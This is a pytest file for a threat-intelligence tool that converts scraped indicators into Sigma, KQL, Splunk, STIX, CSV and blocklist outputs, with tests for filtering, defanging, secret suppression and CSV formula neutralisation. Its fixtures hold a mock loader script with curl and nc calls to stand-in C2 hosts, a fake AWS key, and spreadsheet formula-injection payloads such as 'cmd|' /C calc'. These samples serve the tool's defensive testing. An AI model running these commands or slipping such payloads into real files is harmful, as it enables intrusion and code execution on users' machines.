"""Detection content: the shared filter, every format against its golden file, and the rules.

The golden files under ``tests/golden/detections`` are the exact bytes each
target writes for one fixed run. Set DIRSIFT_UPDATE_GOLDEN=1 to rewrite them
after a deliberate change, then read the diff before keeping it.

Addresses and names are documentation values (RFC 5737, RFC 3849) or made up.
The golden run turns the private and documentation filter off so those
addresses stay in; the filter has tests of its own below.
"""

from __future__ import annotations

import csv
import io
import json
import os
import socket
import zipfile
from datetime import UTC, datetime
from pathlib import Path

import pytest
from typer.testing import CliRunner

from dirsift import cli, rules
from dirsift.detections import (
    TARGETS,
    BadOption,
    Options,
    Run,
    filename,
    parse_tlp,
    parse_types,
    preview,
    render,
    summary,
    zip_bytes,
)
from dirsift.detections.collect import (
    DOCUMENTATION,
    EMPTY_HASH,
    MULTICAST,
    NOT_SHAREABLE,
    PRIVATE,
    PROTOCOL,
    RESERVED_NAME,
    RESOLVER,
    SHARED,
    collect,
)
from dirsift.models import Entry, Ioc, ScanResult

GOLDEN = Path(__file__).parent / "golden" / "detections"
ROOT = "http://panel-gate.xyz/files/"
STARTED = datetime(2026, 10, 1, 9, 0, tzinfo=UTC)
SECRET = "AKIAQWERTYUIOPASDFGH"
EMPTY_SHA256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
EMPTY_MD5 = "d41d8cd98f00b204e9800998ecf8427e"
LOADER_SHA = "9f2c1b7d3e4a5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8"
LOADER_MD5 = "0a1b2c3d4e5f60718293a4b5c6d7e8f9"
GATE = "http://c2.evil-update.top/gate.php?id=1&k=*"
RAW = "https://raw.githubusercontent.com/someone/tools/main/x.ps1"

LIVE = [
    "203.0.113.9",
    "198.51.100.23",
    "c2.evil-update.top",
    "cdn.panel-gate.xyz",
    "panel-gate.xyz",
    "ops@evil-update.top",
    "raw.githubusercontent.com",
    "2001:db8::7",
]


def entry(path: str, **kw) -> Entry:
    return Entry(url=ROOT + path, name=path.rpartition("/")[2], parent_url=ROOT, **kw)


def ioc(kind: str, value: str, source: str = "loader.sh", **kw) -> Ioc:
    return Ioc(
        ioc_type=kind,
        value=value,
        defanged=value.replace(".", "[.]"),
        source_url=ROOT + source,
        sources=[ROOT + source],
        **kw,
    )


def fixture_result() -> ScanResult:
    text = (
        "#!/bin/sh\n"
        f"curl -s {GATE} -o /tmp/.x\n"
        "ping cdn.panel-gate.xyz\n"
        f"export AWS_ACCESS_KEY_ID={SECRET}\n"
        "echo report to ops@evil-update.top\n"
        "nc 203.0.113.9:4444 || nslookup cdn.panel-gate.xyz 8.8.8.8\n"
    )
    entries = [
        entry(
            "loader.sh",
            kind="script",
            sha256=LOADER_SHA,
            md5=LOADER_MD5,
            fetched_bytes=200,
            size=200,
            text_preview=text,
        ),
        entry("empty.txt", kind="data", sha256=EMPTY_SHA256, md5=EMPTY_MD5, size=0),
        entry("bin/payload.exe", kind="pe", truncated=True, head_hex="4d5a9000"),
        entry(
            "notes.txt",
            kind="data",
            sha256="1" * 64,
            md5="2" * 32,
            truncated=True,
            text_preview=f"tools at {RAW}\nkex curve25519-sha256@libssh.org\n",
        ),
    ]
    iocs = [
        ioc("ipv4", "203.0.113.9:4444"),
        ioc("ipv4", "8.8.8.8"),
        ioc("ipv6", "2001:db8::7", source="notes.txt"),
        ioc("domain", "cdn.panel-gate.xyz"),
        ioc("url", GATE),
        ioc("url", RAW, source="notes.txt"),
        ioc("email", "ops@evil-update.top"),
        ioc("email", "curve25519-sha256@libssh.org", source="notes.txt"),
        ioc("secret", SECRET, label="aws_access_key"),
        ioc("btc", "1BoatSLRHtKNngkdXEeobR76b53LETtpyT", source="notes.txt"),
        ioc("mutex", "Global\\dirsift-test", source="notes.txt"),
    ]
    return ScanResult(
        root_url=ROOT,
        started_at=STARTED,
        target_ip="198.51.100.23",
        server="nginx",
        listing_flavor="nginx",
        entries=entries,
        iocs=iocs,
    )


def fixture_run(**kw) -> Run:
    return Run(result=fixture_result(), name="golden-run", **kw)


GOLDEN_OPTIONS = Options(exclude_private=False, pick=(ROOT + "loader.sh",))


@pytest.fixture
def frozen_yara_date(monkeypatch):
    class Frozen(datetime):
        @classmethod
        def now(cls, tz=None):
            return datetime(2026, 10, 1, 12, 0, tzinfo=UTC)

    monkeypatch.setattr(rules, "datetime", Frozen)


# Golden files


@pytest.mark.parametrize("target_id", sorted(TARGETS))
def test_every_target_matches_its_golden_file(target_id, frozen_yara_date):
    target = TARGETS[target_id]
    text = render(target, fixture_run(), GOLDEN_OPTIONS)
    path = GOLDEN / f"{target_id}.{target.ext}"
    if os.environ.get("DIRSIFT_UPDATE_GOLDEN"):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(text.encode("utf-8"))
    # A Windows checkout may turn the golden file's line ends into CRLF; the
    # rendering itself must never carry one, which the next line holds it to.
    assert path.read_bytes().decode("utf-8").replace("\r\n", "\n") == text
    assert "\r" not in text


@pytest.mark.parametrize("target_id", sorted(TARGETS))
def test_rendering_is_deterministic(target_id, frozen_yara_date):
    target = TARGETS[target_id]
    assert render(target, fixture_run(), GOLDEN_OPTIONS) == render(
        target, fixture_run(), GOLDEN_OPTIONS
    )


# The shared filter


DEFAULTS = Options()


def kept(result: ScanResult, options: Options = DEFAULTS) -> set[tuple[str, str]]:
    return {(item.kind, item.value) for item in collect(result, options).indicators}


def dropped(result: ScanResult, options: Options = DEFAULTS) -> dict[str, int]:
    return collect(result, options).left_out()


def single(*iocs: Ioc, root: str = "http://files.evil-update.top/", target_ip=None):
    return ScanResult(root_url=root, started_at=STARTED, target_ip=target_ip, iocs=list(iocs))


@pytest.mark.parametrize(
    ("value", "reason"),
    [
        ("10.0.0.5", PRIVATE),
        ("192.168.1.10", PRIVATE),
        ("127.0.0.1", PRIVATE),
        ("100.64.0.9", PRIVATE),
        ("169.254.10.10", PRIVATE),
        ("240.0.0.1", PRIVATE),
        ("198.18.0.4", PRIVATE),
        ("224.0.0.251", MULTICAST),
        ("239.255.255.250", MULTICAST),
        ("192.0.2.4", DOCUMENTATION),
        ("198.51.100.23", DOCUMENTATION),
        ("203.0.113.9", DOCUMENTATION),
        ("1.1.1.1", RESOLVER),
        ("8.8.8.8", RESOLVER),
    ],
)
def test_addresses_nobody_can_block_are_left_out(value, reason):
    result = single(ioc("ipv4", value + ":443"))
    assert ("ipv4", value) not in kept(result)
    assert dropped(result)[reason] == 1


def test_ipv6_documentation_and_multicast_are_left_out():
    result = single(ioc("ipv6", "2001:db8::1"), ioc("ipv6", "ff02::1"), ioc("ipv6", "fe80::1"))
    assert not [item for item in collect(result, Options()).indicators if item.kind == "ipv6"]
    counts = dropped(result)
    assert counts[DOCUMENTATION] == 1
    assert counts[MULTICAST] == 1
    assert counts[PRIVATE] == 1


def test_a_routable_address_is_kept_without_its_port():
    result = single(ioc("ipv4", "45.155.205.233:8080"))
    assert ("ipv4", "45.155.205.233") in kept(result)


def test_the_private_filter_can_be_turned_off_but_resolvers_stay_out():
    result = single(ioc("ipv4", "10.0.0.5"), ioc("ipv4", "8.8.8.8"))
    loose = kept(result, Options(exclude_private=False))
    assert ("ipv4", "10.0.0.5") in loose
    assert ("ipv4", "8.8.8.8") not in loose


def test_reserved_names_are_left_out():
    result = single(
        ioc("domain", "test.example.net"), ioc("domain", "box.local"), ioc("domain", "a.test")
    )
    assert not [item for item in collect(result, Options()).of("domain") if item.label is None]
    assert dropped(result)[RESERVED_NAME] == 3


def test_protocol_strings_are_left_out_unless_asked_for():
    result = single(
        ioc("email", "curve25519-sha256@libssh.org"), ioc("email", "chacha20-poly1305@openssh.com")
    )
    assert not collect(result, Options()).of("email")
    assert dropped(result)[PROTOCOL] == 2
    assert len(collect(result, Options(exclude_protocol=False)).of("email")) == 2


def test_shared_hosting_enters_as_a_url_only():
    result = single(ioc("url", RAW), ioc("domain", "github.com"))
    values = kept(result)
    assert ("url", RAW) in values
    assert ("domain", "raw.githubusercontent.com") not in values
    assert ("domain", "github.com") not in values
    assert dropped(result)[SHARED] == 2


def test_the_scanned_server_is_labelled_and_a_shared_one_is_not_a_host():
    own = collect(single(root="http://files.evil-update.top/", target_ip="45.155.205.233"),
                  Options())
    labels = {(item.kind, item.value): item.label for item in own.indicators}
    assert labels[("domain", "files.evil-update.top")] == "target"
    assert labels[("ipv4", "45.155.205.233")] == "target"
    assert labels[("url", "http://files.evil-update.top/")] == "target"

    shared = collect(
        single(root="https://bucket.s3.amazonaws.com/drop/", target_ip="52.216.1.1"), Options()
    )
    kinds = {(item.kind, item.value) for item in shared.indicators}
    assert kinds == {("url", "https://bucket.s3.amazonaws.com/drop/")}
    assert shared.left_out()[SHARED] == 2


def test_empty_file_hashes_and_partial_reads_stay_out():
    collected = collect(fixture_result(), Options())
    digests = {item.value for item in collected.of("sha256", "md5")}
    assert digests == {LOADER_SHA, LOADER_MD5}
    assert collected.left_out()[EMPTY_HASH] == 2


def test_secrets_wallets_and_mutexes_are_counted_and_never_carried():
    collected = collect(fixture_result(), Options())
    assert collected.left_out()[NOT_SHAREABLE] == 3
    assert not [item for item in collected.indicators if item.kind not in
                ("ipv4", "ipv6", "domain", "url", "email", "sha256", "md5")]


def test_url_hosts_reach_the_host_level_lists():
    values = kept(single(ioc("url", "http://c2.evil-update.top/a.php")))
    assert ("domain", "c2.evil-update.top") in values


def test_types_and_source_narrow_the_set():
    result = fixture_result()
    only = collect(result, Options(types=frozenset({"domain"})))
    assert {item.kind for item in only.indicators} == {"domain"}
    one = collect(result, Options(source=ROOT + "loader.sh", exclude_private=False))
    assert all(item.label is None for item in one.indicators)
    assert ("ipv6", "2001:db8::7") not in {(i.kind, i.value) for i in one.indicators}
    assert {"sha256", "md5"} <= {item.kind for item in one.indicators}


# What every file says


@pytest.mark.parametrize("target_id", sorted(TARGETS))
@pytest.mark.parametrize("tlp", ["CLEAR", "GREEN", "AMBER", "RED"])
def test_the_tlp_label_is_in_every_output(target_id, tlp):
    target = TARGETS[target_id]
    text = render(target, fixture_run(), Options(tlp=tlp, exclude_private=False,
                                                 pick=(ROOT + "loader.sh",)))
    if target_id == "stix":
        colour = "white" if tlp == "CLEAR" else tlp.lower()
        assert f'"tlp": "{colour}"' in text
    elif target_id == "sigma":
        assert f"tlp.{tlp.lower()}" in text
    elif target_id == "misp":
        assert f'"name": "tlp:{tlp.lower()}"' in text
    else:
        assert f"TLP:{tlp}" in text


def test_the_bare_profile_carries_the_label_in_the_file_name_only():
    run = fixture_run()
    text = render(TARGETS["blocklist-domain"], run, Options(profile="bare"))
    assert "#" not in text
    assert text.splitlines() == ["c2.evil-update.top", "cdn.panel-gate.xyz", "panel-gate.xyz"]
    assert filename(run, TARGETS["blocklist-domain"]) == "dirsift_golden-run_blocklist-domain.txt"


def test_the_palo_alto_profile_keeps_the_comment_on_a_value_line():
    text = render(TARGETS["blocklist-ipv4"], fixture_run(), Options(
        exclude_private=False, profile="paloalto"))
    lines = text.splitlines()
    assert not [line for line in lines if line.startswith("#")]
    assert lines[0].startswith("198.51.100.23 # ")
    assert "TLP:AMBER" in lines[0]


def test_url_lists_drop_the_scheme():
    text = render(TARGETS["blocklist-url"], fixture_run(), Options(profile="bare"))
    assert "c2.evil-update.top/gate.php?id=1&k=*" in text.splitlines()
    assert "http" not in text


@pytest.mark.parametrize("target_id", sorted(TARGETS))
def test_no_secret_reaches_any_output(target_id, frozen_yara_date):
    text = render(TARGETS[target_id], fixture_run(), GOLDEN_OPTIONS)
    assert SECRET not in text
    assert "1BoatSLRHtKNngkdXEeobR76b53LETtpyT" not in text


def test_yara_takes_no_text_from_a_file_that_holds_a_secret(frozen_yara_date):
    """Fail closed: the file's other lines may be the secret's own
    continuation, so a file with a secret gets no string rule at all."""
    result = ScanResult(
        root_url=ROOT,
        started_at=STARTED,
        entries=[entry("env.txt", text_preview=f"AWS_KEY={SECRET}\nthis line is long enough\n")],
        iocs=[ioc("secret", SECRET, source="env.txt")],
    )
    text = rules.build_rules(result, result.entries, "r")
    assert SECRET not in text
    assert "this line is long enough" not in text
    assert "No rule for env.txt: it holds a secret" in text


def test_yara_still_falls_back_to_text_in_a_file_without_a_secret(frozen_yara_date):
    result = ScanResult(
        root_url=ROOT,
        started_at=STARTED,
        entries=[
            entry("env.txt", text_preview=f"AWS_KEY={SECRET}\n"),
            entry("plain.txt", text_preview=f"this line is long enough\nAWS_KEY={SECRET}x\n"),
        ],
        iocs=[ioc("secret", SECRET, source="env.txt")],
    )
    text = rules.build_rules(result, [result.entries[1]], "r")
    assert "this line is long enough" in text
    assert SECRET[:8] not in text


# Preview and download


@pytest.mark.parametrize("target_id", sorted(TARGETS))
def test_the_preview_is_defanged(target_id, frozen_yara_date):
    text = preview(TARGETS[target_id], fixture_run(), GOLDEN_OPTIONS)
    for value in LIVE:
        assert value not in text, value
    assert "http://" not in text and "https://" not in text


@pytest.mark.parametrize("target_id", ["sigma", "splunk", "kql", "csv", "blocklist-ipv4", "stix"])
def test_the_download_is_live(target_id, frozen_yara_date):
    text = render(TARGETS[target_id], fixture_run(), GOLDEN_OPTIONS)
    assert "198.51.100.23" in text or "203.0.113.9" in text


# Formats


def test_sigma_is_a_collection_of_valid_rules():
    import yaml
    text = render(TARGETS["sigma"], fixture_run(), GOLDEN_OPTIONS)
    docs = list(yaml.safe_load_all(text))
    assert [doc["logsource"]["category"] for doc in docs] == [
        "firewall", "dns", "proxy", "process_creation"
    ]
    for doc in docs:
        assert doc["status"] == "experimental"
        assert doc["author"] == "cyb3rp03t"
        assert "tlp.amber" in doc["tags"]
        assert "condition" in doc["detection"]
        assert len(doc["id"]) == 36
    firewall = docs[0]["detection"]["selection"]["dst_ip"]
    assert "203.0.113.9" in firewall and "198.51.100.23" in firewall
    proxy = docs[2]["detection"]
    assert proxy["url_1"]["c-uri|contains"] == ["/gate.php\\?id=1&k=\\*"]
    hosts = [rule["cs-host"] for key, rule in proxy.items() if key.startswith("url_")]
    assert ["raw.githubusercontent.com"] in hosts
    sysmon = docs[3]["detection"]["selection_sysmon"]["Hashes|contains"]
    assert "SHA256=" + LOADER_SHA.upper() in sysmon
    assert len({doc["id"] for doc in docs}) == 4


def test_kql_blocks_run_alone():
    text = render(TARGETS["kql"], fixture_run(), GOLDEN_OPTIONS)
    blocks = text.strip().split("\n\n")[1:]
    assert len(blocks) == 6
    for block in blocks:
        lines = block.splitlines()
        tables = [line for line in lines if line and not line.startswith(("//", "let", "|"))]
        assert len(tables) == 1, block
        names = ("dirsift_ip", "dirsift_domain", "dirsift_url", "dirsift_sha256", "dirsift_md5")
        for name in names:
            if f"({name})" in block:
                assert f"let {name} = dynamic([" in block


def test_spl_uses_cim_fields():
    text = render(TARGETS["splunk"], fixture_run(), GOLDEN_OPTIONS)
    for field in ("All_Traffic.dest_ip=", "DNS.query=", "Web.url=", "Processes.process_hash=",
                  "Filesystem.file_hash="):
        assert field in text


def test_csv_has_one_row_per_indicator_with_label_and_run():
    text = render(TARGETS["csv"], fixture_run(), GOLDEN_OPTIONS)
    rows = list(csv.DictReader(io.StringIO(text)))
    assert rows
    assert {row["tlp"] for row in rows} == {"TLP:AMBER"}
    assert {row["run"] for row in rows} == {"golden-run"}
    target = [row for row in rows if row["label"] == "target"]
    assert {row["value"] for row in target} == {"panel-gate.xyz", "198.51.100.23", ROOT}


HOSTILE = [
    '=HYPERLINK("http://evil-update.top/x","open")',
    "+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "-1+1",
    "\t=1+1",
    "\r=1+1",
]


@pytest.mark.parametrize("value", HOSTILE)
def test_a_cell_that_a_spreadsheet_would_run_is_neutralised(value):
    from dirsift.detections.csvfeed import safe_cell

    cell, escaped = safe_cell(value)
    assert escaped
    assert cell == "'" + value


@pytest.mark.parametrize("value", ["198.51.100.23", "c2.evil-update.top", "loader.sh", ""])
def test_an_ordinary_cell_is_left_alone(value):
    from dirsift.detections.csvfeed import safe_cell

    assert safe_cell(value) == (value, False)


def test_hostile_file_names_and_values_do_not_reach_a_spreadsheet_as_formulas():
    name = HOSTILE[0]
    result = ScanResult(
        root_url=ROOT,
        started_at=STARTED,
        entries=[entry(name, kind="data")],
        iocs=[
            ioc("email", "+cmd|' /C calc'!A0@evil-update.top", source=name),
            ioc("domain", "-1+1", source=name),
        ],
    )
    text = render(TARGETS["csv"], Run(result=result, name="@SUM(1+1)"),
                  Options(exclude_private=False))
    rows = list(csv.reader(io.StringIO(text)))
    assert rows[0][-1] == "escaped"
    for row in rows[1:]:
        for cell in row:
            assert not cell.startswith(("=", "+", "-", "@", "\t", "\r")), cell
    by_value = {row[1]: row for row in rows[1:]}
    domain = by_value["'-1+1"]
    # The name holds a , and an =, so it is percent-encoded as well.
    assert domain[2] == "'" + name.replace(",", "%2C")
    assert domain[5] == "'@SUM(1+1)"
    assert domain[-1] == "value source_file source_file:pct run"
    # Every cell is quoted, so a separator inside a value never splits it.
    assert all(line.startswith('"') for line in text.splitlines())


def test_stix_carries_the_marking_and_the_author():
    stix2 = pytest.importorskip("stix2")
    bundle = json.loads(render(TARGETS["stix"], fixture_run(), GOLDEN_OPTIONS))
    amber = stix2.TLP_AMBER.id
    for obj in bundle["objects"]:
        if obj["type"] != "marking-definition":
            assert obj["object_marking_refs"] == [amber]
        if obj["type"] in ("indicator", "infrastructure", "relationship"):
            assert obj["created_by_ref"].startswith("identity--")
    stix2.parse(bundle, allow_custom=False)


def test_stix_without_a_label_is_unchanged():
    from dirsift.stix import build_bundle

    bundle = build_bundle(fixture_result(), [])
    assert not [obj for obj in bundle["objects"] if "object_marking_refs" in obj]


def test_options_parse_and_refuse():
    assert parse_tlp(None) == "AMBER"
    assert parse_tlp("tlp:green") == "GREEN"
    with pytest.raises(BadOption):
        parse_tlp("WHITE")
    assert parse_types(["ipv4,domain"], ("ipv4", "domain")) == frozenset({"ipv4", "domain"})
    with pytest.raises(BadOption):
        parse_types(["secret"], ("ipv4",))


def test_summary_counts_by_target():
    info = summary(fixture_run(), Options())
    by_id = {target["id"]: target for target in info["targets"]}
    assert by_id["blocklist-domain"]["counts"] == {"domain": 3}
    assert by_id["blocklist-ipv4"]["left_out"][DOCUMENTATION] >= 1
    assert info["left_out"][NOT_SHAREABLE] == 3


def test_zip_holds_every_target_and_a_manifest(frozen_yara_date):
    data = zip_bytes(fixture_run(), GOLDEN_OPTIONS, list(TARGETS.values()))
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        names = archive.namelist()
        assert "MANIFEST.txt" in names
        assert len(names) == len(TARGETS) + 1
        assert "TLP:AMBER" in archive.read("MANIFEST.txt").decode()
    assert data == zip_bytes(fixture_run(), GOLDEN_OPTIONS, list(TARGETS.values()))


# Rules of engagement


def test_the_detections_package_never_opens_a_socket(monkeypatch, frozen_yara_date):
    def refuse(*args, **kwargs):
        raise AssertionError("the detections package tried to open a socket")

    monkeypatch.setattr(socket, "socket", refuse)
    monkeypatch.setattr(socket, "create_connection", refuse)
    monkeypatch.setattr(socket, "getaddrinfo", refuse)
    run = fixture_run()
    for target in TARGETS.values():
        render(target, run, GOLDEN_OPTIONS)
        preview(target, run, GOLDEN_OPTIONS)
    summary(run, GOLDEN_OPTIONS)
    zip_bytes(run, GOLDEN_OPTIONS, list(TARGETS.values()))


def test_the_detections_package_imports_no_network_module():
    package = Path(__file__).parents[1] / "src" / "dirsift" / "detections"
    for path in package.glob("*.py"):
        text = path.read_text(encoding="utf-8")
        for name in ("httpx", "socket", "urllib.request", "requests", "http.client", "enrich"):
            assert f"import {name}" not in text, (path.name, name)
            assert f"from {name}" not in text and f"from ..{name}" not in text, (path.name, name)


# The command

runner = CliRunner()


def saved(tmp_path: Path) -> Path:
    path = tmp_path / "golden-run.json"
    path.write_text(fixture_result().model_dump_json(), encoding="utf-8")
    return path


def test_cli_writes_one_target_and_never_to_stdout(tmp_path):
    out = tmp_path / "out"
    result = runner.invoke(cli.app, ["detections", str(saved(tmp_path)), "--target", "sigma",
                                     "-o", str(out)])
    assert result.exit_code == 0, result.output
    written = out / "dirsift_golden-run_sigma.yml"
    assert written.exists()
    assert "203.0.113.9" not in result.output
    assert "TLP:AMBER" in written.read_text(encoding="utf-8") or "tlp.amber" in written.read_text(
        encoding="utf-8")


def test_cli_requires_an_output(tmp_path):
    result = runner.invoke(cli.app, ["detections", str(saved(tmp_path)), "--target", "sigma"])
    assert result.exit_code != 0


def test_cli_writes_all_to_a_folder_or_a_zip(tmp_path):
    run = saved(tmp_path)
    folder = tmp_path / "all"
    result = runner.invoke(cli.app, ["detections", str(run), "--target", "all", "--tlp", "green",
                                     "-o", str(folder)])
    assert result.exit_code == 0, result.output
    names = sorted(path.name for path in folder.iterdir())
    assert "MANIFEST.txt" in names
    assert "dirsift_golden-run_kql.kql" in names
    assert "dirsift_golden-run_yara.yar" not in names  # nothing picked
    assert "tlp.green" in (folder / "dirsift_golden-run_sigma.yml").read_text(encoding="utf-8")
    for path in folder.iterdir():
        assert b"\r" not in path.read_bytes(), path.name  # the same bytes on every platform

    archive = tmp_path / "all.zip"
    result = runner.invoke(cli.app, ["detections", str(run), "--target", "all", "-o", str(archive)])
    assert result.exit_code == 0, result.output
    with zipfile.ZipFile(archive) as opened:
        assert "MANIFEST.txt" in opened.namelist()


def test_cli_lists_targets_without_writing(tmp_path):
    result = runner.invoke(cli.app, ["detections", str(saved(tmp_path)), "--list"])
    assert result.exit_code == 0, result.output
    for target_id in TARGETS:
        assert target_id in result.output


def test_cli_refuses_an_unknown_target_or_label(tmp_path):
    run = saved(tmp_path)
    bad = runner.invoke(cli.app, ["detections", str(run), "--target", "nope", "-o", str(tmp_path)])
    assert bad.exit_code == 2
    worse = runner.invoke(cli.app, ["detections", str(run), "--target", "csv", "--tlp", "white",
                                    "-o", str(tmp_path)])
    assert worse.exit_code == 2


# STIX in the rule pack


STIX_OPTION_SETS = [
    Options(),
    Options(exclude_private=False),
    Options(types=frozenset({"domain", "url"})),
    Options(types=frozenset({"sha256"})),
    Options(source=ROOT + "notes.txt", exclude_private=False),
    Options(tlp="RED", exclude_protocol=False),
]


@pytest.mark.parametrize("options", STIX_OPTION_SETS, ids=range(len(STIX_OPTION_SETS)))
def test_the_stix_card_counts_what_the_bundle_carries(options):
    """The card's number is the number of indicators in the downloaded bundle."""
    run = fixture_run()
    card = next(t for t in summary(run, options)["targets"] if t["id"] == "stix")
    bundle = json.loads(render(TARGETS["stix"], run, options))
    indicators = [obj for obj in bundle["objects"] if obj["type"] == "indicator"]
    assert len(indicators) == card["count"]
    values = {
        obj["value"]
        for obj in bundle["objects"]
        if obj["type"] in ("ipv4-addr", "ipv6-addr", "domain-name", "url")
    }
    kept = {item.value for item in collect(run.result, options).of("ipv4", "ipv6", "domain", "url")}
    assert values == kept


def test_the_stix_target_drops_what_the_filter_drops():
    text = render(TARGETS["stix"], fixture_run(), Options())
    for value in ("8.8.8.8", "203.0.113.9", "198.51.100.23", "2001:db8::7", "libssh.org"):
        assert value not in text, value
    # A shared host stays out at host level; the URL on it stays in.
    bundle = json.loads(text)
    names = {obj.get("value") for obj in bundle["objects"]}
    assert "raw.githubusercontent.com" not in names
    assert RAW in names


@pytest.mark.parametrize("level", ["CLEAR", "GREEN", "AMBER", "RED"])
def test_the_filtered_bundle_passes_the_strict_validator(level):
    from stix2validator import ValidationOptions, validate_string

    for options in (Options(tlp=level), Options(tlp=level, exclude_private=False)):
        text = render(TARGETS["stix"], fixture_run(), options)
        results = validate_string(text, ValidationOptions(version="2.1", strict=True))
        assert results.is_valid, [str(error) for error in results.errors]


def test_the_cli_stix_bundle_stays_whole_but_keeps_secrets_out():
    """``dirsift stix`` is the whole run by contract, never a secret, never a webhook."""
    from dirsift.stix import build_bundle, bundle_json

    hook = "https://discord.com/api/webhooks/1234567890/AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"
    result = fixture_result()
    result.iocs.append(ioc("url", hook))
    result.iocs.append(ioc("secret", hook, label="discord_webhook"))
    text = bundle_json(build_bundle(result, []))
    assert "8.8.8.8" in text
    assert "AbCdEfGhIjKl" not in text


# CSV under any separator

FORMULA = ("=", "+", "-", "@", "\t", "\r")

#: Names and values that turn into formulas once a spreadsheet splits a row on
#: ; or , or a tab, even though no cell starts with a formula character.
SPLIT_HOSTILE_FILES = [
    "a;=1+1;b.txt",
    "x,=cmd|' /C calc'!A0,y.txt",
    "sub;+2+3/run.sh",
    "c;@SUM(1+1);d.txt",
    "e;-2+3;f.txt",
    "g;\t=1;h.txt",
    'q;"=1+1";r.txt',
    "s; =1+1.txt",
    "t,%3B=1.txt",
]
SPLIT_HOSTILE_URLS = [
    "http://evil.top/a;=1+1;b",
    "http://evil.top/p?x=1,=2+3",
    "http://evil.top/q;@SUM(1)",
    "http://evil.top/r,-1+2",
]
SPLIT_HOSTILE_RUN = "run;=1+1,+2"


def split_hostile_run() -> Run:
    entries = [entry(name, kind="data", sha256=format(n + 3, "064x")) for n, name in
               enumerate(SPLIT_HOSTILE_FILES)]
    iocs = []
    for number, url in enumerate(SPLIT_HOSTILE_URLS):
        iocs.append(ioc("url", url, source=SPLIT_HOSTILE_FILES[number]))
    iocs.append(ioc("domain", "evil.top", source=SPLIT_HOSTILE_FILES[-1]))
    for name in SPLIT_HOSTILE_FILES:
        iocs.append(ioc("domain", "shared-c2.top", source=name))
    result = ScanResult(root_url=ROOT, started_at=STARTED, entries=entries, iocs=iocs)
    return Run(result=result, name=SPLIT_HOSTILE_RUN)


def test_no_piece_of_a_row_starts_a_formula_whatever_the_separator():
    text = render(TARGETS["csv"], split_hostile_run(), Options(exclude_private=False))
    lines = text.split("\n")
    assert lines[0].startswith('"type"')
    assert len(lines) > 5
    for line in lines[1:]:
        if not line:
            continue
        for separator in (",", ";", "\t"):
            for piece in line.split(separator):
                stripped = piece.strip(' "')
                assert not stripped.startswith(FORMULA), (separator, piece, line)


def test_the_csv_has_no_bom_and_no_sep_line():
    text = render(TARGETS["csv"], split_hostile_run(), Options(exclude_private=False))
    assert not text.startswith("﻿")
    assert not text.lower().startswith("sep=")
    assert text.startswith('"type","value"')


def test_escaped_cells_come_back_byte_for_byte():
    """An importer strips one ' from a named cell and percent-decodes a :pct one."""
    from urllib.parse import unquote

    run = split_hostile_run()
    options = Options(exclude_private=False)
    text = render(TARGETS["csv"], run, options)
    rows = list(csv.DictReader(io.StringIO(text)))
    collected = {(item.kind, item.value): item for item in collect(run.result, options).indicators}
    seen_pct = 0
    for row in rows:
        tokens = row["escaped"].split()
        assert "," not in row["escaped"] and ";" not in row["escaped"]
        back = {}
        for column in ("type", "value", "source_file", "run"):
            cell = row[column]
            if column in tokens:
                assert cell.startswith("'")
                cell = cell[1:]
            if column + ":pct" in tokens:
                seen_pct += 1
                cell = unquote(cell)
            back[column] = cell
        item = collected[(back["type"], back["value"])]
        assert back["source_file"] == " | ".join(item.sources)
        assert back["run"] == SPLIT_HOSTILE_RUN
    assert seen_pct >= len(SPLIT_HOSTILE_URLS)


def test_sources_are_joined_with_a_bar():
    text = render(TARGETS["csv"], split_hostile_run(), Options(exclude_private=False))
    rows = list(csv.DictReader(io.StringIO(text)))
    shared = next(row for row in rows if row["value"] == "shared-c2.top")
    assert " | " in shared["source_file"]
